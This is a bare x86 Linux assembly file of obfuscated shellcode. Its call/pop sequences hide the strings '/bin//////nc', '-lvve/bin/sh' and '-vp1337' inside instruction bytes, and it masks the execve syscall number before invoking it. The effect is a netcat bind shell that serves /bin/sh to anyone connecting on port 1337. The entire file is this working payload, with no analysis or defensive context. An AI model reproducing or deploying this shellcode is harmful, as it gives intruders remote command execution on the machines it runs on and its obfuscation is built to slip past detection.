
global _start

section .text
_start:

cdq
mul edx

;call $+ 0xf ;\xe8\x0a\x00\x00\x00
;lea esp, $+2
push dword $ + 2
jmp short third_arg

sub    eax,0x33317076
xor    esi,DWORD [edi]
aaa
add    byte [eax], al   ;\x00\x00

pop edx

call $ + 0x13   ; use lea to esp, push and jmp????
sub   eax,0x6576766c    ; \xe8\x0e\x00\x00\x00
das
bound  ebp, [ecx+0x6e]
das
jae $+0x6a
;add    byte [eax], al   ;\x00\x00 ; add other opcode and subtract after pop
pop ecx

call $ + 0x12   ;\xe8\x0d\x00\x00\x00
das
bound  ebp, [ecx+0x6e]
das
das
das
das
das
das
outsb
arpl word [eax],ax  ; \x63\x00
pop ebx

push eax
push edx
push ecx
push ebx

mov eax, 0x454e4a2f
;add ax, 0x1000

xor edx,edx
mov  ecx,esp
and eax,0x3a31358b
int 0x80
